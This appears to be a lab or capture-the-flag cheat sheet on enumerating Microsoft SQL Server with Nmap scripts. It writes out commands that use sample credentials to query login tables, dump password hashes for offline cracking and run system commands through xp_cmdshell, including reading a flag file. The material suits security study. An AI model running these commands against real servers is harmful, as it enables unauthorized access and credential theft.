## Microsoft SQL Server Enumeration

MSSQL runs on **TCP port 1433**. Nmap NSE scripts enable query execution, hash dumping, and command execution via `xp_cmdshell`.

---

## Nmap MSSQL Scripts

### Execute SQL Query

```bash
nmap 192.168.177.129 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
```

| Component | Purpose |
|-----------|---------|
| `ms-sql-query` | Execute arbitrary SQL query |
| `mssql.username` | MSSQL username |
| `mssql.password` | MSSQL password |
| `ms-sql-query.query` | SQL statement to run |
| `-oN` | Save output to normal file |

---

### Dump Password Hashes

```bash
nmap 192.168.177.129 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
```

---

### Execute System Commands (xp_cmdshell)

```bash
# Run ipconfig
nmap 192.168.177.129 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"

# Read flag file
nmap 192.168.177.129 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
```

---

## Script Reference

| Script | Purpose | Privilege |
|--------|---------|-----------|
| `ms-sql-query` | Execute SQL queries | Database user |
| `ms-sql-dump-hashes` | Extract password hashes | Database user |
| `ms-sql-xp-cmdshell` | Run OS commands via SQL | Requires `xp_cmdshell` enabled |

---

## Key Takeaways

| Item                | Detail                                    |
| ------------------- | ----------------------------------------- |
| Default port        | 1433                                      |
| `xp_cmdshell`       | Stored procedure for OS command execution |
| `master..syslogins` | System table containing login info        |
| Hash dump           | Offline cracking with John/Hashcat        |
| Command output      | Use `type` for Windows file reading       |
